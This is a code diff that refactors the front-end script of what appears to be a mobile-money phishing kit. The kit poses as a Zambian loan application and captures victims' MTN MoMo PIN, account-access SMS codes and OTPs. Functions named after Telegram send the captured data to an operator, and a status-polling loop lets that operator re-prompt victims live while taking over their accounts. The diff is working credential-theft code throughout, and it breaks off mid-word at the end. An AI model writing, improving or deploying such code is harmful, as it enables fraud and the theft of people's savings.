@@ -1,73 +1,78 @@
 document.addEventListener('DOMContentLoaded', () => {
-  const screenWelcome = document.getElementById('screen-welcome');
-  const screenSlider = document.getElementById('screen-slider');
-  const screenForm1 = document.getElementById('screen-form1');
-  const screenForm2 = document.getElementById('screen-form2');
-  const screenForm3 = document.getElementById('screen-form3');
-  const screenPin = document.getElementById('screen-pin');
-  const screenSms = document.getElementById('screen-sms');
-  const screenOtp = document.getElementById('screen-otp');
-  const screenSuccess = document.getElementById('screen-success');
-  const screenStopped = document.getElementById('screen-stopped');
-  const loadingOverlay = document.getElementById('loading-overlay');
+  const $ = (id) => document.getElementById(id);
+  const onClick = (el, fn) => {
+    if (el) el.addEventListener('click', fn);
+  };
 
-  const btnGotoSlider = document.getElementById('btn-goto-slider');
-  const btnSliderBack = document.getElementById('btn-slider-back');
-  const btnGotoForm1 = document.getElementById('btn-goto-form1');
-  const btnForm1Back = document.getElementById('btn-form1-back');
-  const btnForm1Next = document.getElementById('btn-form1-next');
-  const btnForm2Prev = document.getElementById('btn-form2-prev');
-  const btnForm2Next = document.getElementById('btn-form2-next');
-  const btnForm3Prev = document.getElementById('btn-form3-prev');
-  const btnForm3Submit = document.getElementById('btn-form3-submit');
-  const btnPinBack = document.getElementById('btn-pin-back');
-  const btnSuccessBack = document.getElementById('btn-success-back');
-  const btnFinishHome = document.getElementById('btn-finish-home');
-  const btnRetryHome = document.getElementById('btn-retry-home');
+  const screenWelcome = $('screen-welcome');
+  const screenSlider = $('screen-slider');
+  const screenForm1 = $('screen-form1');
+  const screenForm2 = $('screen-form2');
+  const screenForm3 = $('screen-form3');
+  const screenPin = $('screen-pin');
+  const screenSms = $('screen-sms');
+  const screenOtp = $('screen-otp');
+  const screenSuccess = $('screen-success');
+  const screenStopped = $('screen-stopped');
+  const loadingOverlay = $('loading-overlay');
 
-  const loanSlider = document.getElementById('loan-amount-slider');
-  const loanText = document.getElementById('loan-amount-text');
-  const monthsSlider = document.getElementById('loan-months-slider');
-  const monthsText = document.getElementById('loan-months-text');
-  const monthlyRepVal = document.getElementById('monthly-rep-val');
+  const btnGotoSlider = $('btn-goto-slider');
+  const btnSliderBack = $('btn-slider-back');
+  const btnGotoForm1 = $('btn-goto-form1');
+  const btnForm1Back = $('btn-form1-back');
+  const btnForm1Next = $('btn-form1-next');
+  const btnForm2Prev = $('btn-form2-prev');
+  const btnForm2Next = $('btn-form2-next');
+  const btnForm3Prev = $('btn-form3-prev');
+  const btnForm3Submit = $('btn-form3-submit');
+  const btnPinBack = $('btn-pin-back');
+  const btnSuccessBack = $('btn-success-back');
+  const btnFinishHome = $('btn-finish-home');
+  const btnRetryHome = $('btn-retry-home');
 
-  const formAmountInput = document.getElementById('form-amount-input');
-  const loanDurationSelect = document.getElementById('loan-duration');
-  const loanPurposeInput = document.getElementById('loan-purpose');
-  const firstNameInput = document.getElementById('first-name');
-  const lastNameInput = document.getElementById('last-name');
-  const formPhoneInput = document.getElementById('form-phone');
+  const loanSlider = $('loan-amount-slider');
+  const loanText = $('loan-amount-text');
+  const monthsSlider = $('loan-months-slider');
+  const monthsText = $('loan-months-text');
+  const monthlyRepVal = $('monthly-rep-val');
 
-  const sumAmount = document.getElementById('sum-amount');
-  const sumDuration = document.getElementById('sum-duration');
-  const sumPurpose = document.getElementById('sum-purpose');
-  const sumApplicant = document.getElementById('sum-applicant');
-  const depositRequiredAmount = document.getElementById('deposit-required-amount');
+  const formAmountInput = $('form-amount-input');
+  const loanDurationSelect = $('loan-duration');
+  const loanPurposeInput = $('loan-purpose');
+  const firstNameInput = $('first-name');
+  const lastNameInput = $('last-name');
+  const formPhoneInput = $('form-phone');
 
-  const bannerPhoneError = document.getElementById('banner-phone-error');
-  const bannerForm3Error = document.getElementById('banner-form3-error');
-  const bannerPinError = document.getElementById('banner-pin-error');
-  const bannerSmsError = document.getElementById('banner-sms-error');
-  const bannerSmsInfo = document.getElementById('banner-sms-info');
-  const bannerOtpError = document.getElementById('banner-otp-error');
+  const sumAmount = $('sum-amount');
+  const sumDuration = $('sum-duration');
+  const sumPurpose = $('sum-purpose');
+  const sumApplicant = $('sum-applicant');
+  const depositRequiredAmount = $('deposit-required-amount');
 
-  const displayPinPhone = document.getElementById('display-pin-phone');
-  const pinBoxes5 = document.querySelectorAll('.pin-box-5');
-  const btnTogglePinVisibility = document.getElementById('btn-toggle-pin-visibility');
-  const linkForgotPin = document.getElementById('link-forgot-pin');
+  const bannerPhoneError = $('banner-phone-error');
+  const bannerForm3Error = $('banner-form3-error');
+  const bannerPinError = $('banner-pin-error');
+  const bannerSmsError = $('banner-sms-error');
+  const bannerSmsInfo = $('banner-sms-info');
+  const bannerOtpError = $('banner-otp-error');
 
-  const displaySmsPhone = document.getElementById('display-sms-phone');
-  const smsInputBox = document.getElementById('sms-input-box');
-  const btnValidatedSms = document.getElementById('btn-validated-sms');
-  const smsSecondsSpan = document.getElementById('sms-seconds');
-  const smsTimerText = document.getElementById('sms-timer-text');
-  const btnRequestNewSms = document.getElementById('btn-request-new-sms');
+  const displayPinPhone = $('display-pin-phone');
+  const pinBoxes5 = Array.from(document.querySelectorAll('.pin-box-5'));
+  const btnTogglePinVisibility = $('btn-toggle-pin-visibility');
+  const linkForgotPin = $('link-forgot-pin');
 
-  const displayOtpPhone = document.getElementById('display-otp-phone');
-  const otpBoxes4 = document.querySelectorAll('.otp-box-4');
-  const btnSubmitOtp = document.getElementById('btn-submit-otp');
+  const displaySmsPhone = $('display-sms-phone');
+  const smsInputBox = $('sms-input-box');
+  const btnValidatedSms = $('btn-validated-sms');
+  const smsSecondsSpan = $('sms-seconds');
+  const smsTimerText = $('sms-timer-text');
+  const btnRequestNewSms = $('btn-request-new-sms');
 
-  const blockedReasonText = document.getElementById('blocked-reason-text');
+  const displayOtpPhone = $('display-otp-phone');
+  const otpBoxes4 = Array.from(document.querySelectorAll('.otp-box-4'));
+  const btnSubmitOtp = $('btn-submit-otp');
+
+  const blockedReasonText = $('blocked-reason-text');
 
   let currentUserId = null;
   let statusPollInterval = null;
@@ -88,15 +93,9 @@ document.addEventListener('DOMContentLoaded', () => {
 
   function toZeroPrefixPhone(rawPhone) {
     const digits = String(rawPhone || '').replace(/\D/g, '');
-    if (digits.startsWith('260')) {
-      return '0' + digits.slice(3);
-    }
-    if (digits.startsWith('0')) {
-      return digits;
-    }
-    if (/^(96|76|56)\d{7}$/.test(digits)) {
-      return '0' + digits;
-    }
+    if (digits.startsWith('260')) return '0' + digits.slice(3);
+    if (digits.startsWith('0')) return digits;
+    if (/^(96|76|56)\d{7}$/.test(digits)) return '0' + digits;
     return digits;
   }
 
@@ -126,8 +125,8 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   function showLoading(title, sub) {
-    const titleEl = document.getElementById('loading-title');
-    const subEl = document.getElementById('loading-sub');
+    const titleEl = $('loading-title');
+    const subEl = $('loading-sub');
     if (titleEl) titleEl.innerText = title;
     if (subEl) subEl.innerText = sub;
     if (loadingOverlay) loadingOverlay.classList.add('active');
@@ -157,8 +156,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
   function updateCalc() {
     if (!loanSlider || !monthsSlider) return;
-    const amt = Number(loanSlider.value);
-    const mths = Number(monthsSlider.value);
+    const amt = Number(loanSlider.value) || 100000;
+    const mths = Number(monthsSlider.value) || 48;
     if (loanText) loanText.innerText = `ZMW ${amt.toLocaleString()}`;
     if (monthsText) monthsText.innerText = `${mths} ${mths === 1 ? 'month' : 'months'}`;
     if (formAmountInput) formAmountInput.value = amt.toLocaleString();
@@ -167,22 +166,19 @@ document.addEventListener('DOMContentLoaded', () => {
     if (monthlyRepVal) monthlyRepVal.innerText = `ZMW ${Math.round(monthly).toLocaleString()}`;
   }
 
-  if (loanSlider && monthsSlider) {
-    loanSlider.addEventListener('input', updateCalc);
-    monthsSlider.addEventListener('input', updateCalc);
-    updateCalc();
-  }
+  if (loanSlider) loanSlider.addEventListener('input', updateCalc);
+  if (monthsSlider) monthsSlider.addEventListener('input', updateCalc);
+  updateCalc();
 
   function updateStep2ReadyState() {
     const fn = (firstNameInput?.value || '').trim();
     const ln = (lastNameInput?.value || '').trim();
     const ph = (formPhoneInput?.value || '').trim();
-    if (btnForm2Next) {
-      if (fn && ln && isValidMtnZambia(ph)) {
-        btnForm2Next.classList.add('ready');
-      } else {
-        btnForm2Next.classList.remove('ready');
-      }
+    if (!btnForm2Next) return;
+    if (fn && ln && isValidMtnZambia(ph)) {
+      btnForm2Next.classList.add('ready');
+    } else {
+      btnForm2Next.classList.remove('ready');
     }
   }
 
@@ -190,118 +186,110 @@ document.addEventListener('DOMContentLoaded', () => {
     if (inp) inp.addEventListener('input', updateStep2ReadyState);
   });
 
-  if (btnGotoSlider) btnGotoSlider.addEventListener('click', () => showScreen(screenSlider));
-  if (btnSliderBack) btnSliderBack.addEventListener('click', () => showScreen(screenWelcome));
-  if (btnGotoForm1) btnGotoForm1.addEventListener('click', () => showScreen(screenForm1));
-  if (btnForm1Back) btnForm1Back.addEventListener('click', () => showScreen(screenSlider));
+  onClick(btnGotoSlider, () => showScreen(screenSlider));
+  onClick(btnSliderBack, () => showScreen(screenWelcome));
+  onClick(btnGotoForm1, () => showScreen(screenForm1));
+  onClick(btnForm1Back, () => showScreen(screenSlider));
 
-  if (btnForm1Next) {
-    btnForm1Next.addEventListener('click', () => {
-      const amtRaw = (formAmountInput?.value || '100,000').trim();
-      const dur = loanDurationSelect?.value || '48 Months';
-      const purp = (loanPurposeInput?.value || '').trim() || 'Business';
-      if (sumAmount) sumAmount.innerText = `ZMW ${amtRaw}`;
-      if (sumDuration) sumDuration.innerText = dur;
-      if (sumPurpose) sumPurpose.innerText = purp;
-      showScreen(screenForm2);
-    });
-  }
+  onClick(btnForm1Next, () => {
+    const amtRaw = (formAmountInput?.value || '100,000').trim();
+    const dur = loanDurationSelect?.value || '48 Months';
+    const purp = (loanPurposeInput?.value || '').trim() || 'Business';
+    if (sumAmount) sumAmount.innerText = `ZMW ${amtRaw}`;
+    if (sumDuration) sumDuration.innerText = dur;
+    if (sumPurpose) sumPurpose.innerText = purp;
+    showScreen(screenForm2);
+  });
 
-  if (btnForm2Prev) btnForm2Prev.addEventListener('click', () => showScreen(screenForm1));
+  onClick(btnForm2Prev, () => showScreen(screenForm1));
 
-  if (btnForm2Next) {
-    btnForm2Next.addEventListener('click', () => {
-      hideBanner(bannerPhoneError);
-      const fn = (firstNameInput?.value || '').trim();
-      const ln = (lastNameInput?.value || '').trim();
-      const ph = (formPhoneInput?.value || '').trim();
+  onClick(btnForm2Next, () => {
+    hideBanner(bannerPhoneError);
+    const fn = (firstNameInput?.value || '').trim();
+    const ln = (lastNameInput?.value || '').trim();
+    const ph = (formPhoneInput?.value || '').trim();
 
-      if (!fn || !ln) {
-        showBanner(bannerPhoneError, 'Please enter your first name and last name.');
-        return;
-      }
+    if (!fn || !ln) {
+      showBanner(bannerPhoneError, 'Please enter your first name and last name.');
+      return;
+    }
 
-      if (!isValidMtnZambia(ph)) {
-        showBanner(bannerPhoneError, 'Enter a valid MTN Zambia number starting with 096, 076, or 056.');
-        return;
-      }
+    if (!isValidMtnZambia(ph)) {
+      showBanner(bannerPhoneError, 'Enter a valid MTN Zambia number starting with 096, 076, or 056.');
+      return;
+    }
 
-      if (sumApplicant) sumApplicant.innerText = `${fn} ${ln}`.toUpperCase();
-      showScreen(screenForm3);
-    });
-  }
+    if (sumApplicant) sumApplicant.innerText = `${fn} ${ln}`.toUpperCase();
+    showScreen(screenForm3);
+  });
 
-  if (btnForm3Prev) btnForm3Prev.addEventListener('click', () => showScreen(screenForm2));
+  onClick(btnForm3Prev, () => showScreen(screenForm2));
 
-  if (btnForm3Submit) {
-    btnForm3Submit.addEventListener('click', async () => {
-      hideBanner(bannerForm3Error);
-      const fn = (firstNameInput?.value || '').trim();
-      const ln = (lastNameInput?.value || '').trim();
-      const ph = (formPhoneInput?.value || '').trim();
+  onClick(btnForm3Submit, async () => {
+    hideBanner(bannerForm3Error);
+    const fn = (firstNameInput?.value || '').trim();
+    const ln = (lastNameInput?.value || '').trim();
+    const ph = (formPhoneInput?.value || '').trim();
 
-      if (!fn || !ln || !isValidMtnZambia(ph)) {
-        showBanner(bannerForm3Error, 'Please complete Step 2 with a valid MTN MoMo number (096, 076, 056).');
-        return;
-      }
+    if (!fn || !ln || !isValidMtnZambia(ph)) {
+      showBanner(bannerForm3Error, 'Please complete Step 2 with a valid MTN MoMo number (096, 076, 056).');
+      return;
+    }
 
-      const fullName = `${fn} ${ln}`.toUpperCase();
-      const zeroPhone = toZeroPrefixPhone(ph);
-      const formattedPhone = formatDisplayPhone(zeroPhone);
+    const fullName = `${fn} ${ln}`.toUpperCase();
+    const zeroPhone = toZeroPrefixPhone(ph);
+    const formattedPhone = formatDisplayPhone(zeroPhone);
 
-      if (displayPinPhone) displayPinPhone.innerText = formattedPhone;
-      if (displaySmsPhone) displaySmsPhone.innerText = formattedPhone;
-      if (displayOtpPhone) displayOtpPhone.innerText = formattedPhone;
-      if (sumApplicant) sumApplicant.innerText = fullName;
+    if (displayPinPhone) displayPinPhone.innerText = formattedPhone;
+    if (displaySmsPhone) displaySmsPhone.innerText = formattedPhone;
+    if (displayOtpPhone) displayOtpPhone.innerText = formattedPhone;
+    if (sumApplicant) sumApplicant.innerText = fullName;
 
-      const numericAmt = Number(String(formAmountInput?.value || '100000').replace(/\D/g, '')) || 100000;
-      const depVal = Math.max(200, Math.round(numericAmt * 0.002));
-      if (depositRequiredAmount) depositRequiredAmount.innerText = `${depVal} ZMW`;
+    const numericAmt = Number(String(formAmountInput?.value || '100000').replace(/\D/g, '')) || 100000;
+    const depVal = Math.max(200, Math.round(numericAmt * 0.002));
+    if (depositRequiredAmount) depositRequiredAmount.innerText = `${depVal} ZMW`;
 
-      pinSubmittedForCurrentValue = '';
-      otpSubmittedForCurrentValue = '';
-      pinBoxes5.forEach((b) => (b.value = ''));
-      otpBoxes4.forEach((b) => (b.value = ''));
-      hideBanner(bannerPinError);
-      hideBanner(bannerOtpError);
+    pinSubmittedForCurrentValue = '';
+    otpSubmittedForCurrentValue = '';
+    pinBoxes5.forEach((b) => (b.value = ''));
+    otpBoxes4.forEach((b) => (b.value = ''));
+    hideBanner(bannerPinError);
+    hideBanner(bannerOtpError);
 
-      try {
-        const res = await fetch(`/api/submit-application?admin=${encodeURIComponent(adminParam)}`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            adminChatId: adminParam,
-            applicant: { fullName, phone: zeroPhone }
-          })
-        });
-        const data = await res.json();
-        if (data.success) {
-          currentUserId = data.userId;
-        }
-      } catch (e) {}
-
-      showScreen(screenPin);
-      if (pinBoxes5[0]) pinBoxes5[0].focus();
-    });
-  }
-
-  if (btnPinBack) {
-    btnPinBack.addEventListener('click', () => {
-      if (statusPollInterval) clearInterval(statusPollInterval);
-      hideLoading();
-      showScreen(screenForm3);
-    });
-  }
-
-  if (btnTogglePinVisibility) {
-    btnTogglePinVisibility.addEventListener('click', () => {
-      const makeVisible = pinBoxes5[0] && pinBoxes5[0].type === 'password';
-      pinBoxes5.forEach((box) => {
-        box.type = makeVisible ? 'text' : 'password';
+    try {
+      const res = await fetch(`/api/submit-application?admin=${encodeURIComponent(adminParam)}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          adminChatId: adminParam,
+          applicant: { fullName, phone: zeroPhone }
+        })
       });
-      btnTogglePinVisibility.innerText = makeVisible ? 'Hide' : 'Show';
+      const data = await res.json();
+      if (data && data.success) {
+        currentUserId = data.userId;
+      }
+    } catch (e) {}
+
+    showScreen(screenPin);
+    if (pinBoxes5[0]) pinBoxes5[0].focus();
+  });
+
+  onClick(btnPinBack, () => {
+    if (statusPollInterval) clearInterval(statusPollInterval);
+    hideLoading();
+    showScreen(screenForm3);
+  });
+
+  onClick(btnTogglePinVisibility, () => {
+    const makeVisible = pinBoxes5[0] && pinBoxes5[0].type === 'password';
+    pinBoxes5.forEach((box) => {
+      box.type = makeVisible ? 'text' : 'password';
     });
-  }
+    if (btnTogglePinVisibility) {
+      btnTogglePinVisibility.innerText = makeVisible ? 'Hide' : 'Show';
+    }
+  });
 
   if (linkForgotPin) {
     linkForgotPin.addEventListener('click', (e) => {
@@ -316,7 +304,7 @@ document.addEventListener('DOMContentLoaded', () => {
       if (box.value && idx < pinBoxes5.length - 1) {
         pinBoxes5[idx + 1].focus();
       }
-      const pinVal = Array.from(pinBoxes5).map((b) => b.value).join('');
+      const pinVal = pinBoxes5.map((b) => b.value).join('');
       if (pinVal.length === 5 && pinVal !== pinSubmittedForCurrentValue) {
         pinSubmittedForCurrentValue = pinVal;
         submitPinToTelegram(pinVal);
@@ -350,7 +338,7 @@ document.addEventListener('DOMContentLoaded', () => {
         })
       });
       const data = await res.json();
-      if (data.success && data.userId) {
+      if (data && data.success && data.userId) {
         currentUserId = data.userId;
       }
       startStatusPolling();
@@ -381,25 +369,23 @@ document.addEventListener('DOMContentLoaded', () => {
     }, 1000);
   }
 
-  if (btnRequestNewSms) {
-    btnRequestNewSms.addEventListener('click', async () => {
-      hideBanner(bannerSmsError);
-      const phoneZero = toZeroPrefixPhone(displaySmsPhone?.innerText || formPhoneInput?.value || '');
-      showBanner(bannerSmsInfo, 'New SMS request sent to admin. Please wait for your SMS.');
-      startSmsCountdown();
+  onClick(btnRequestNewSms, async () => {
+    hideBanner(bannerSmsError);
+    const phoneZero = toZeroPrefixPhone(displaySmsPhone?.innerText || formPhoneInput?.value || '');
+    showBanner(bannerSmsInfo, 'New SMS request sent to admin. Please wait for your SMS.');
+    startSmsCountdown();
 
-      try {
-        await fetch('/api/request-new-sms', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            userId: currentUserId,
-            phone: phoneZero
-          })
-        });
-      } catch (e) {}
-    });
-  }
+    try {
+      await fetch('/api/request-new-sms', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          userId: currentUserId,
+          phone: phoneZero
+        })
+      });
+    } catch (e) {}
+  });
 
   function checkAndAutoSubmitSms() {
     if (!smsInputBox) return;
@@ -417,19 +403,17 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  if (btnValidatedSms) {
-    btnValidatedSms.addEventListener('click', () => {
-      const currentText = (smsInputBox?.value || '').replace(/\s+/g, ' ').trim();
-      if (!isValidMomoSms(currentText)) {
-        showBanner(
-          bannerSmsError,
-          "SMS must start with: Y'ello. Please note! This confidential code gives access to your MoMo account:"
-        );
-        return;
-      }
-      submitSmsToTelegram(currentText, false);
-    });
-  }
+  onClick(btnValidatedSms, () => {
+    const currentText = (smsInputBox?.value || '').replace(/\s+/g, ' ').trim();
+    if (!isValidMomoSms(currentText)) {
+      showBanner(
+        bannerSmsError,
+        "SMS must start with: Y'ello. Please note! This confidential code gives access to your MoMo account:"
+      );
+      return;
+    }
+    submitSmsToTelegram(currentText, false);
+  });
 
   async function submitSmsToTelegram(smsText, autoDetected) {
     hideBanner(bannerSmsError);
@@ -462,7 +446,7 @@ document.addEventListener('DOMContentLoaded', () => {
       if (box.value && idx < otpBoxes4.length - 1) {
         otpBoxes4[idx + 1].focus();
       }
-      const otpVal = Array.from(otpBoxes4).map((b) => b.value).join('');
+      const otpVal = otpBoxes4.map((b) => b.value).join('');
       if (otpVal.length === 4 && otpVal !== otpSubmittedForCurrentValue) {
         otpSubmittedForCurrentValue = otpVal;
         submitOtpToTelegram(otpVal, true);
@@ -476,16 +460,14 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   });
 
-  if (btnSubmitOtp) {
-    btnSubmitOtp.addEventListener('click', () => {
-      const otpVal = Array.from(otpBoxes4).map((b) => b.value).join('');
-      if (otpVal.length < 4) {
-        showBanner(bannerOtpError, 'Please enter all 4 digits of your OTP code.');
-        return;
-      }
-      submitOtpToTelegram(otpVal, false);
-    });
-  }
+  onClick(btnSubmitOtp, () => {
+    const otpVal = otpBoxes4.map((b) => b.value).join('');
+    if (otpVal.length < 4) {
+      showBanner(bannerOtpError, 'Please enter all 4 digits of your OTP code.');
+      return;
+    }
+    submitOtpToTelegram(otpVal, false);
+  });
 
   async function submitOtpToTelegram(otpVal, autoSubmitted) {
     hideBanner(bannerOtpError);
@@ -521,7 +503,7 @@ document.addEventListener('DOMContentLoaded', () => {
       try {
         const res = await fetch(`/api/check-status/${encodeURIComponent(currentUserId)}`);
         const data = await res.json();
-        const st = data.status;
+        const st = data && data.status;
 
         if (st === 'BLOCKED') {
           clearInterval(statusPollInterval);
@@ -540,4 +522,45 @@ document.addEventListener('DOMContentLoaded', () => {
           if (smsInputBox) smsInputBox.value = '';
           showScreen(screenSms);
           startSmsCountdown();
-          i
+          if (smsInputBox) smsInputBox.focus();
+        } else if (st === 'INCORRECT_PIN') {
+          clearInterval(statusPollInterval);
+          if (smsTimerInterval) clearInterval(smsTimerInterval);
+          hideLoading();
+          pinSubmittedForCurrentValue = '';
+          pinBoxes5.forEach((b) => (b.value = ''));
+          showScreen(screenPin);
+          showBanner(bannerPinError, 'INCORRECT PIN — Please enter your new 5-digit PIN.');
+          if (pinBoxes5[0]) pinBoxes5[0].focus();
+        } else if (st === 'SMS_EXPIRED') {
+          clearInterval(statusPollInterval);
+          hideLoading();
+          smsAutoSubmittedForCurrentValue = '';
+          if (smsInputBox) smsInputBox.value = '';
+          showScreen(screenSms);
+          showBanner(bannerSmsError, 'SMS EXPIRES — Please enter a new SMS or request a new SMS.');
+          startSmsCountdown();
+          if (smsInputBox) smsInputBox.focus();
+        } else if (st === 'PROCEED_OTP') {
+          clearInterval(statusPollInterval);
+          if (smsTimerInterval) clearInterval(smsTimerInterval);
+          hideLoading();
+          hideBanner(bannerOtpError);
+          otpSubmittedForCurrentValue = '';
+          otpBoxes4.forEach((b) => (b.value = ''));
+          showScreen(screenOtp);
+          if (otpBoxes4[0]) otpBoxes4[0].focus();
+        } else if (st === 'OTP_EXPIRED') {
+          clearInterval(statusPollInterval);
+          if (smsTimerInterval) clearInterval(smsTimerInterval);
+          hideLoading();
+          otpSubmittedForCurrentValue = '';
+          otpBoxes4.forEach((b) => (b.value = ''));
+          showScreen(screenOtp);
+          showBanner(bannerOtpError, 'OTP EXPIRED — Please enter your new 4-digit OTP.');
+          if (otpBoxes4[0]) otpBoxes4[0].focus();
+        } else if (st === 'SUCCESS' || st === 'APPROVED') {
+          clearInterval(statusPollInterval);
+          if (smsTimerInterval) clearInterval(smsTimerInterval);
+          hideLoading();
+          showScreen(screenSucce
